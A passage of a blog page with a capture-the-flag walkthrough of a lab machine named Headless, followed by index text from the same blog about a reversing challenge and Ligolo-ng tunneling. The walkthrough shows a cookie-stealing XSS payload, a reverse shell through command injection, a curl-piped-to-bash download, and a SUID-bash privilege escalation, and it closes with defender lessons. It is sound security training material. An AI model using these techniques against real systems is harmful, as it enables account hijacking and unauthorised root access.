</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Accept:&lt;/<span style=color:#f92672>strong</span>&gt; text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Accept-Language:&lt;/<span style=color:#f92672>strong</span>&gt; en-US,en;q=0.5&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Accept-Encoding:&lt;/<span style=color:#f92672>strong</span>&gt; gzip, deflate, br&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Content-Type:&lt;/<span style=color:#f92672>strong</span>&gt; application/x-www-form-urlencoded&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Content-Length:&lt;/<span style=color:#f92672>strong</span>&gt; 91&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Origin:&lt;/<span style=color:#f92672>strong</span>&gt; http://10.10.11.8:5000&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Dnt:&lt;/<span style=color:#f92672>strong</span>&gt; 1&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Connection:&lt;/<span style=color:#f92672>strong</span>&gt; close&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Referer:&lt;/<span style=color:#f92672>strong</span>&gt; http://10.10.11.8:5000/support&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Cookie:&lt;/<span style=color:#f92672>strong</span>&gt; is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Upgrade-Insecure-Requests:&lt;/<span style=color:#f92672>strong</span>&gt; 1&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;Sec-Gpc:&lt;/<span style=color:#f92672>strong</span>&gt; 1&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>pre</span>&gt;
</span></span></code></pre></div><p>Most of these fields are user-controllable, but the ones with least restriction to them are inevitably the <strong>cookie</strong> and the <strong>user-agent</strong>. Since the <strong>user-agent</strong> can be literally anything, let&rsquo;s play with that first.</p><p>The reflected text&rsquo;s only parent is the <code>&lt;pre></code> node, so I should be able to just introduce a new element.</p><p>Also, for successful XSS we&rsquo;ll need something to catch the data exfiltrated. For this, I&rsquo;ll use a simple python webserver:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo ufw allow from $RADDR to any port <span style=color:#ae81ff>8000</span> proto tcp
</span></span><span style=display:flex><span>python3 -m http.server <span style=color:#ae81ff>8000</span>
</span></span></code></pre></div><p>Now, let&rsquo;s send a simple &ldquo;redirect&rdquo; XSS to the target, using the <code>User-Agent</code> header:</p><p><img src=/walkthrough/headless/xss%20attempt%201.png alt="xss attempt 1"></p><p>To my delight, after a few seconds of waiting, the &ldquo;administrator&rdquo; took a peek, and was redirected!</p><p><img src=/walkthrough/headless/successful%20xss.png alt="successful xss"></p><p>Fantastic, so we now have the administrator&rsquo;s cookie: <code>is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code></p><p>I&rsquo;ll try navigating to the <code>/dashboard</code> page and swap out the cookie for this one:</p><p><img src=/walkthrough/headless/dashboard%20as%20admin.png alt="dashboard as admin"></p><p>This worked perfectly!</p><p><img src=/walkthrough/headless/admin%20dashboard%201.png alt="admin dashboard 1"></p><p>I&rsquo;ll copy the cookie into my browser so I don&rsquo;t have to keep proxying it.</p><h3 id=aside-xss-local-testing>Aside: XSS local testing</h3><p>I&rsquo;ll admit&mldr; I&rsquo;m horrendously bad at XSS right now. To be honest, I&rsquo;ve only used it once or twice. To get the stuff from the <a href=/walkthrough/headless/#XSS>previous section</a> to work, I had to test it locally first. This was my test environment:</p><ul><li>Python http.server running locally, awaiting connections from the target</li><li>An <code>html</code> file containing my XSS payload.</li></ul><p>I would then load the <code>html</code> file in my browser, and check the http.server to see if it had a hit.</p><p>The html file was as follows. Note that I was testing the XSS in two places - the <code>&lt;script></code> at the bottom, and the <code>&lt;span></code> reflecting the user agent:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>http-equiv</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;X-UA-Compatible&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ie=edge&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>title</span>&gt;XSS Test Page&lt;/<span style=color:#f92672>title</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>setCookie</span>(<span style=color:#a6e22e>name</span>, <span style=color:#a6e22e>value</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>date</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Date();
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>date</span>.<span style=color:#a6e22e>setTime</span>(<span style=color:#a6e22e>date</span>.<span style=color:#a6e22e>getTime</span>() <span style=color:#f92672>+</span> (<span style=color:#ae81ff>365</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>24</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>60</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>60</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>));
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>expires</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;; expires=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>date</span>.<span style=color:#a6e22e>toUTCString</span>();
</span></span><span style=display:flex><span>            document.<span style=color:#a6e22e>cookie</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;=&#34;</span> <span style=color:#f92672>+</span> (<span style=color:#a6e22e>value</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>expires</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;; path=/&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        window.<span style=color:#a6e22e>onload</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>() {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>setCookie</span>(<span style=color:#e6db74>&#34;is_admin&#34;</span>, <span style=color:#e6db74>&#34;yougotme...yay!&#34;</span>);
</span></span><span style=display:flex><span>            document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;userAgent&#39;</span>).<span style=color:#a6e22e>innerText</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>navigator</span>.<span style=color:#a6e22e>userAgent</span>;
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span>  &lt;/<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>main</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>h1</span>&gt;Welcome to My Website&lt;/<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>ul</span>&gt;&lt;<span style=color:#f92672>li</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>h3</span>&gt;XSS via user agent test&lt;/<span style=color:#f92672>h3</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;note-text&#34;</span>&gt;User Agent: &lt;<span style=color:#f92672>span</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;userAgent&#34;</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>li</span>&gt;&lt;/<span style=color:#f92672>ul</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>main</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>script</span>&gt;document.<span style=color:#a6e22e>location</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://127.0.0.1:8000/hello?c=&#34;</span><span style=color:#f92672>+</span>document.<span style=color:#a6e22e>cookie</span>;&lt;/<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span>  &lt;/<span style=color:#f92672>body</span>&gt;
</span></span></code></pre></div><h2 id=user-flag>USER FLAG</h2><h3 id=gaining-rce>Gaining RCE</h3><p>Now that we&rsquo;ve found a way into the <code>/dashboard</code>, let&rsquo;s figure out how to turn this into RCE - or if it&rsquo;s possible. Let&rsquo;s examine the request that occurs when we click <em>Generate Report</em>:</p><p><img src=/walkthrough/headless/generate%20report.png alt="generate report"></p><p>Interesting. That&rsquo;s a format that pretty much anything could use. If we&rsquo;re extra lucky, it&rsquo;s just getting interpreted by the shell, probably to write to some kind of log file or be part of a filename using the <code>date</code> function.</p><p>Just in case, I&rsquo;ll start up a reverse shell listener:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo ufw allow from $RADDR to any port <span style=color:#ae81ff>4444</span> proto tcp
</span></span><span style=display:flex><span>bash
</span></span><span style=display:flex><span>socat -d TCP_LISTEN:4444 STDOUT
</span></span></code></pre></div><p>Now let&rsquo;s try sending a really simple reverse shell payload. I&rsquo;ll URL-encode the highlighted bit below:</p><p><img src=/walkthrough/headless/reverse%20shell%20payload.png alt="reverse shell payload"></p><p>Wow - this must be my lucky day!</p><p><img src=/walkthrough/headless/got%20reverse%20shell.png alt="got reverse shell"></p><blockquote><p>If I&rsquo;m not mistaken, <code>dvir</code> is the name of the box creator.</p></blockquote><p>Fantastic. Let&rsquo;s search for the user flag:</p><p><img src=/walkthrough/headless/user%20flag.png alt="user flag"></p><p>It&rsquo;s in the home directory, so just <code>cat</code> it for the points &#x1f389;</p><pre tabindex=0><code>cat /home/dvir/user.txt
</code></pre><h3 id=ssh-connection>SSH Connection</h3><p>To get a little more comfortable, I&rsquo;ll switch to SSH.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># On the attacker machine:</span>
</span></span><span style=display:flex><span>ssh-keygen -t rsa -b <span style=color:#ae81ff>4096</span> <span style=color:#75715e># used passphrase p1geon</span>
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>700</span> ./id_rsa
</span></span><span style=display:flex><span>base64 -w <span style=color:#ae81ff>0</span> id_rsa.pub | tee id_rsa.pub64
</span></span><span style=display:flex><span><span style=color:#75715e># On the target machine:</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;c3NoLXJ....bGkK&#39;</span> | base64 -d &gt;&gt; ~/.ssh/authorized_keys
</span></span><span style=display:flex><span><span style=color:#75715e># On attacker machine:</span>
</span></span><span style=display:flex><span>ssh -i ./id_rsa dvir@$RADDR
</span></span></code></pre></div><p>Hmm, looks like I have some mail waiting for me:</p><p><img src=/walkthrough/headless/ssh%20connection.png alt="ssh connection"></p><h2 id=root-flag>ROOT FLAG</h2><h3 id=checking-the-mail>Checking the mail</h3><p>Mail should be in <code>/var/mail/$USER</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /var/mail/dvir
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Subject: Important Update: New System Check Script
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Hello!
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>We have an important update regarding our server. In response to recent compatibility and crashing issues, we&#39;ve introduced a new system check script.
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>What&#39;s special for you?
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>- You&#39;ve been granted special privileges to use this script.
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>- It will help identify and resolve system issues more efficiently.
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>- It ensures that necessary updates are applied when needed.
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Rest assured, this script is at your disposal and won&#39;t affect your regular use of the system.
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>If you have any questions or notice anything unusual, please don&#39;t hesitate to reach out to us. We&#39;re here to assist you with any concerns.
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>By the way, we&#39;re still waiting on you to create the database initialization script!
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Best regards,
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Headless
</span></span></span></code></pre></div><p>To find this rapidly, I checked using <code>linpeas</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -s http://10.10.14.19:8000/linpeas.sh | bash
</span></span></code></pre></div><p>Found it without too much trouble. This must be what the email was referring to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>User dvir may run the following commands on headless:
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    (ALL) NOPASSWD: /usr/bin/syscheck
</span></span></span></code></pre></div><p>I&rsquo;ll try running it:</p><p><img src=/walkthrough/headless/syscheck.png alt=syscheck></p><p>Maybe I can read it and see what it&rsquo;s up to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$EUID<span style=color:#e6db74>&#34;</span> -ne <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  exit <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>last_modified_time<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>/usr/bin/find /boot -name <span style=color:#e6db74>&#39;vmlinuz*&#39;</span> -exec stat -c %Y <span style=color:#f92672>{}</span> + | /usr/bin/sort -n | /usr/bin/tail -n 1<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>formatted_time<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>/usr/bin/date -d <span style=color:#e6db74>&#34;@</span>$last_modified_time<span style=color:#e6db74>&#34;</span> +<span style=color:#e6db74>&#34;%d/%m/%Y %H:%M&#34;</span><span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#e6db74>&#34;Last Kernel Modification Time: </span>$formatted_time<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>disk_space<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>/usr/bin/df -h / | /usr/bin/awk <span style=color:#e6db74>&#39;NR==2 {print $4}&#39;</span><span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#e6db74>&#34;Available disk space: </span>$disk_space<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>load_average<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>/usr/bin/uptime | /usr/bin/awk -F<span style=color:#e6db74>&#39;load average:&#39;</span> <span style=color:#e6db74>&#39;{print $2}&#39;</span><span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#e6db74>&#34;System load average: </span>$load_average<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ! /usr/bin/pgrep -x <span style=color:#e6db74>&#34;initdb.sh&#34;</span> &amp;&gt;/dev/null; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#e6db74>&#34;Database service is not running. Starting it...&#34;</span>
</span></span><span style=display:flex><span>  ./initdb.sh 2&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#e6db74>&#34;Database service is running.&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exit <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>&#x1f602; Ok, I see the vulnerable line. It&rsquo;s the call to <code>./initdb.sh 2>/dev/null</code>. This line uses only a relative path, yet I can run this script from anywhere. I&rsquo;ll just cook up a script to copy over an SUID bash, saving it as <code>make_suid_bash.sh</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>cp /usr/bin/bash /tmp/.Tools/bash
</span></span><span style=display:flex><span>chmod u+s /tmp/.Tools/bash
</span></span></code></pre></div><p>Now I&rsquo;ll download it onto the target and call it <code>initdb.sh</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mkdir -p /tmp/.Tools
</span></span><span style=display:flex><span>curl -o initdb.sh http://10.10.14.19:8000/make_suid_bash.sh
</span></span><span style=display:flex><span>chmod +x initdb.sh
</span></span></code></pre></div><p>Everything is in place now - I just need to run it:</p><p><img src=/walkthrough/headless/made%20suid%20bash.png alt="made suid bash"></p><p>There&rsquo;s the SUID bash! Run it with <code>-p</code> to gain a root shell:</p><p><img src=/walkthrough/headless/root%20shell.png alt="root shell"></p><p>&#x1f609; That&rsquo;s all. Just <code>cat</code> the root flag to finish off the box:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /root/root.txt
</span></span></code></pre></div><h2 id=lessons-learned>LESSONS LEARNED</h2><div class='lessons-container attacker'><img class=lessons-image src=/images/swords-128.png alt="two crossed swords"><h3 id=attacker>Attacker</h3><ul><li><p>&#x1f52c; <strong>Test locally as much as you want</strong>. This box was a great refresher in some basic XSS techniques for me. It&rsquo;s not something I do often, so the practice was welcome. As such, I had to scrap together a quick test system to try to perform XSS on a site made to mimic the target. No shame in that - all practice is good.</p></li><li><p>&#x1f40c; <strong>Start an SSH connection</strong> even if you don&rsquo;t strictly need to. On this box, logging in via SSH prompted us to check our mail. This is one tiny benefit of using SSH. Another benefit is that, if SSHd is already running on the target, it&rsquo;s a <em>lot</em> more stealthy to connect to a port explicitly granting access, instead of some ludicrous-looking shell being passed through TCP port 4444! &#x1f602;</p></li></ul></div><div class='lessons-container defender'><img class=lessons-image src=/images/shield-128.png alt="two crossed swords"><h3 id=defender>Defender</h3><ul><li><p>&#8252;&#xfe0f; <strong>Exceptional cases matter just as much</strong> as the &ldquo;normal&rdquo; operation of a system, when considering security. While the administrators had cleverly included mechanisms to catch XSS and SSTI attempts, they introduced the very vulnerability they were trying to patch by displaying the exceptional case to the user.</p></li><li><p>&#x1f6b3; <strong>Know what code is trusted, and what is not</strong>. Think of all of the code that can be ran as root by a low-privilege user as being functionally the same as code that can <em>only</em> be ran by root. On this box, privesc to root was easy because there was some code being ran from a sudo-able script, where that code was user-editable! Anything that can be ran by root should be in <code>/usr/sbin</code> or something similarly locked-down. Mind your permissions, please!</p></li></ul></div></div><hr><p>Thanks for reading</p><p><span>🤝🤝🤝🤝</span><br><span>@4wayhandshake</span></p></div></article><hr></main></div><footer class=footer><script>window.store={"https://4wayhandshake.github.io/ctf/find-the-easy-pass/":{title:"Find the Easy Pass",tags:["Wine","Winedbg","GDB","Dynamic Analysis"],categories:["Challenge","HTB","Reversing","Easy"],content:`FIRST TAKE We&rsquo;re provided with just a single file, EasyPass.exe. It&rsquo;s an exe file, so on Linux we&rsquo;ll need to run it through wine:
wine EasyPass.exe When we enter a test password, we get a modal indicating the wrong password was used:
DISASSEMBLY Normally, these would by my go-to tools for analyzing an exe:
ILSpy BinaryNinja Ghidra ILSpy ILSpy didn&rsquo;t work at all.
BinaryNinja BinaryNinja is my favourite for doing small, simple programs, so I started with that. However, after taking a look at the disassembled code, it&rsquo;s clear that BinaryNinja did a terrible job on this one (for example, there aren&rsquo;t even any call instructions &#x1f440;)
Ghidra In Ghidra, we start a fresh project, choose a directory, then use the Code Analysis tool, loading EasyPass.exe
&#x1f3c6; Ghidra can be really annoying to use, but in this case it vastly outperformed BinaryNinja.
Since I don&rsquo;t see any main function, a good place to start is by looking for recognizable strings. Use Search &gt; For Strings&hellip; to open a tool for this. All of the recognizable text on the window (and modal) contains the word password, so let&rsquo;s search for that:
Enter Password exists only in the .data segment - it is apparently not referenced in the code at all (which makes sense, since it&rsquo;s fully static: we&rsquo;ll see that same text regardless of what happens at runtime.)
Wrong Password! is actually referenced in the code. Here&rsquo;s the data:
Now if we right-click on the address and use References &gt; Show References to Address, we see that it&rsquo;s referenced at .code address 0x454144:
We see two spots where a string &ldquo;message&rdquo; is being moved into EAX then calling the same function: the function call is clearly to something that shows the modal window, so I&rsquo;ve renamed it to showModal in Ghidra (right-click, Edit Function).
So what determines which message get&rsquo;s shown? We can see in the above image that the message is chosen by that JNZ (Jump if Nonzero) instruction at 0x454136. This makes the code jump to the specified address if the ZF (Zero Flag) in the status register is not set, which is almost always due to some kind of comparison (CMP) instruction &#x1f914;
The CMP instruction that sets (or doesn&rsquo;t set) the ZF bit would be very close to the JNZ. This is because pretty much all comparison operators use this same ZF bit, so it must be between the JNZ call and whatever &ldquo;if&rdquo; statement, &ldquo;while&rdquo; loop, or any other conditional logic preceded the JNZ.
However, when we look for the CMP instruction (or something like it), we don&rsquo;t actually find it nearby. Instead, we see a CALL instruction - this might be the true source of the CMP. Conspicuously, there are two registers (EAX and EDX) being loaded onto the stack right before the CALL instruction, indicating that these are arguments to the function call.
On a hunch, we can label the function being called as checkPassword:
To check if our hunch is correct, we&rsquo;ll run it in something like radare2 or gdb.
DYNAMIC ANALYSIS Normally, we could just load the binary into gdb or radare directly; this challenge uses an .exe, so we&rsquo;ll have to use Wine to accomplish this:
winedbg --gdb EasyPass.exe This will load the binary through are more-or-less familiar GDB interface:
&#x261d;&#xfe0f; Remember: our hunch is that the CALL instruction at 0x454131 might be some kind of password-checking function. Our goal here is to examine what arguments the were placed on the stack before the CALL instruction.
Let&rsquo;s set a breakpoint at 0x454131 then run the program:
break *0x454131 continue The window appears and we once again enter some random &ldquo;test&rdquo; password:
As soon as we click Check Password, the breakpoint trips:
We can examine the registers using x. To make gdb assume that the register is actually a string (thus, a pointer to the beginning of a C-style string), we can use the /s format identifier. To tell gdb what to examine, we provide either a memory address, or tell it to read an address directly out of a register:
x /s 0x1442460 x /s $eax Nice! It&rsquo;s the password we entered &#x1f44d; Now let&rsquo;s check the other argument, which should be in edx:
x /s 0x1443688 x /s $edx &#x1f601; Alright! That looks like it might be the real password. To proceed with the program and guess another password, let&rsquo;s proceed past the breakpoint using c or continue:
continue We can try the password fortran!:
&#x1f370; Confirmed - that is the password! We can now enter the flag as HTB{fortran!}.
`,url:"https://4wayhandshake.github.io/ctf/find-the-easy-pass/"},"https://4wayhandshake.github.io/strategy/tunneling-with-ligolo-ng/":{title:"Tunneling with Ligolo-ng",tags:["Proxy","Tunnel","Pivot","Internal Services"],categories:["Strategy","Pivoting","Tunneling"],content:`INTRODUCTION A few times before, I&rsquo;ve had woes about my proxying/tunneling system. Traditionally, I&rsquo;ve used either of these solutions when trying to access internally-listening services on the target:
ssh -L forwarding individual ports (great if you already have credentials for SSH) SOCKS5 proxy over chisel (great if you have a reverse shell but no credentials, or want to &ldquo;forward&rdquo; all ports at once) Motivation However, when trying to access internally-facing websites, I&rsquo;ve often had problems with using a SOCKS5 proxy.
Typically I&rsquo;ll do this by starting a web browser in max privacy and safe mode (to limit how many extra requests are emitted by my browser) and running FoxyProxy browser extension to localhost:1080. This works&hellip; eventually. It can be extremely slow.
The privesc stage of WifineticTwo is a fantastic demonstration of how this SOCKS5 complication can be problematic.
Check out the part that I stumbled at, here in my walkthrough.
DOWNLOADS Start by downloading and extracting the latest proxy and agent procompiled binaries from the github repo. Both the attacker and target hosts are on amd64 linux:
cd ./www # web root of my http server curl -O https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz curl -O https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz # Extract the proxy binary onto our attacker host. tar -zxf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz From the target host, let&rsquo;s download the agent binary from our HTTP server, which is still running on port 8000:
mkdir -p /tmp/.Tools; cd /tmp/.Tools curl -O http://10.10.14.5:8000/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz tar -zxf ligolo-ng_agent_0.7.5_linux_amd64.tar.gz # extracts a binary called &#34;agent&#34; CONFIGURATION Unlike SOCKS5 over chisel, this system requires a little bit of configuration. We need to create an interface, wait for a connection from the agent, then open the tunnel.
First, let&rsquo;s create the interface. I&rsquo;ll call it ligolo, but the name is arbitrary:
sudo ./ligolo-ng-proxy -selfcert # use a self-signed certificate This operation drops you into a console for ligolo-ng. We can do all of the proxy configuration inside this console. Note that this initial command shows you the proxy fingerprint, which we&rsquo;ll need later.
Opening a Session Using the ligolo-ng-proxy console on the attacker host, create an interface so that the agent (on the target host) has something to connect back to:
&gt;&gt; interface_create --name ligolo Now, on the target host, connect the agent (target) to the proxy (attacker). From the target host (over your reverse shell or whatever), connect back to the attacker host port 11601, the default port:
It&rsquo;s best to background this process, unless you&rsquo;re already in tmux or screen:
./agent -connect 10.10.14.5:11601 -accept-fingerprint [paste proxy fingerprint] &amp; The proxy (attacker) side acknowledges this connection, too:
